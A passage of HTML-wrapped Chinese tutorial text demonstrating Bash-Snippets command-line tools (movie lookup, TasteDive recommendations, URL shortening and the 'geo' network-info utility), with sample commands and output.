style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83db1695840431-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83db1695840431-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83db1695840431-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83db1695840431-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83db1695840431-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83db1695840431-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83db1695840431-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83db1695840431-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83db1695840431-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83db1695840431-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83db1695840431-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83db1695840431-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83db1695840431-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">movies </span><span class=\"crayon-v\">mother</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83db1695840431-2\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670d83db1695840431-3\"><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">==</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83db1695840431-4\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Title</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Mother</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83db1695840431-5\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Year</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2009</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83db1695840431-6\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Tomato</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">95</span><span class=\"crayon-o\">%</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83db1695840431-7\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Rated</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">R</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83db1695840431-8\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Genre</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Crime</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Drama</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Mystery</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83db1695840431-9\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Director</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Bong </span><span class=\"crayon-e\">Joon </span><span class=\"crayon-v\">Ho</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83db1695840431-10\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Actors</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Hye</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">ja </span><span class=\"crayon-v\">Kim</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Bin </span><span class=\"crayon-v\">Won</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Goo </span><span class=\"crayon-v\">Jin</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Je</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">mun </span><span class=\"crayon-v\">Yun</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83db1695840431-11\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Plot</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mother </span><span class=\"crayon-e\">desperately </span><span class=\"crayon-e\">searches </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">killer </span><span class=\"crayon-e\">who </span><span class=\"crayon-e\">framed </span><span class=\"crayon-e\">her </span><span class=\"crayon-e\">son </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">girl</span>'<span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">horrific </span><span class=\"crayon-v\">murder</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83db1695840431-12\"><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">==</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0148 seconds] -->\r\n<p></p>\n<h4 id=\"toc_8\">6、 显示类似条目</h4>\n<p>要使用这个脚本，你需要从<strong><a href=\"https://tastedive.com/account/api_access\">这里</a></strong> 获取 API 密钥。不过不用担心，它完全是免费的。一旦你获得 API 密钥后，将以下行添加到 <code>~/.bash_profile</code>：<code>export TASTE_API_KEY=”你的 API 密钥放在这里”</code>。（LCTT 译注： TasteDive 是一个推荐引擎，它会根据你的品味推荐相关项目。）</p>\n<p>现在你可以根据你提供的项目查看类似项目，如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83db4683717611\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ taste -i Red Hot Chilli Peppers</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83db4683717611-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83db4683717611-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">taste</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Red </span><span class=\"crayon-e\">Hot </span><span class=\"crayon-e\">Chilli </span><span class=\"crayon-v\">Peppers</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h4 id=\"toc_9\">7、 Short – 缩短 URL</h4>\n<p>这个脚本会缩短给定的 URL。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83db7587076514\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ short &lt;URL&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83db7587076514-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83db7587076514-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">short</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">URL</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h4 id=\"toc_10\">8、 Geo – 显示网络的详情</h4>\n<p>这个脚本会帮助你查找网络的详细信息，例如广域网、局域网、路由器、 dns、mac 地址和 ip 地址。</p>\n<p>例如，要查找你的局域网 ip，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83dba103794152\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ geo -l</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dba103794152-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83dba103794152-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">geo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>我系统上的输出：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83dbd482846120\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n192.168.43.192</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dbd482846120-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83dbd482846120-1\"><span class=\"crayon-cn\">192.168.43.192</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>查看广域网 ip：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83dc1779189851\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ geo -w</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dc1779189851-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83dc1779189851-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">geo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">w</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>在终端中输入 <code>geo</code> 来查看更多详细信息。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83dc4127492521\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ geo\r\nGeo\r\nDescription: Provides quick access for wan, lan, router, dns, mac, and ip geolocation data\r\nUsage: geo [flag]\r\n -w Returns WAN IP\r\n -l Returns LAN IP(s)\r\n -r Returns Router IP\r\n -d Returns DNS Nameserver\r\n -m Returns MAC address for interface. Ex. eth0\r\n -g Returns Current IP Geodata\r\nExamples:\r\n geo -g\r\n geo -wlrdgm eth0\r\nCustom Geo Output =&gt;\r\n[all] [query] [city] [region] [country] [zip] [isp]\r\nExample: geo -a 8.8.8.8 -o city,zip,isp\r\n -o [options] Returns Specific Geodata\r\n -a [address] For specific ip in -s\r\n -v Returns Version\r\n -h Returns Help Screen\r\n -u Updates Bash-Snippets</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dc4127492521-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dc4127492521-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dc4127492521-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dc4127492521-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dc4127492521-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dc4127492521-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dc4127492521-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dc4127492521-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dc4127492521-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dc4127492521-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dc4127492521-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dc4127492521-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dc4127492521-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dc4127492521-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dc4127492521-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dc4127492521-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dc4127492521-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dc4127492521-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dc4127492521-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dc4127492521-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dc4127492521-21\">21</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83dc4127492521-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">geo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dc4127492521-2\"><span class=\"crayon-e\">Geo</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83dc4127492521-3\"><span class=\"crayon-v\">Description</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Provides </span><span class=\"crayon-e\">quick </span><span class=\"crayon-e\">access </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wan</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lan</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">router</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">dns</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mac</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ip </span><span class=\"crayon-e\">geolocation </span><span class=\"crayon-e\">data</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dc4127492521-4\"><span class=\"crayon-v\">Usage</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">geo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">flag</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83dc4127492521-5\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Returns </span><span class=\"crayon-e\">WAN </span><span class=\"crayon-v\">IP</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dc4127492521-6\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span 